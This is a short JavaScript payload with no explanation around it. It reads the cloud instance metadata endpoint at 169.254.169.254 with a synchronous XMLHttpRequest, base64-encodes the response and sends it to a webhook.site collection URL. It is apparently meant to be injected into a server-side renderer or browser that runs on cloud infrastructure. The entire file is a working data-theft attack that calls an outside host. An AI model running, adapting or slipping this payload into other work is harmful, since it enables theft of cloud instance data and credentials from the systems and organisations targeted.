
const request = new XMLHttpRequest();
request.open("GET", "http://169.254.169.254/latest/meta-data", false);
request.send(null);

//if (request.status === 200) {

   const request2 = new XMLHttpRequest();
   request2.open("GET", "https://webhook.site/61d14abf-1552-4231-ac33-481aca823fff?r="+btoa(request.responseText), false);
   request2.send(null);
//}


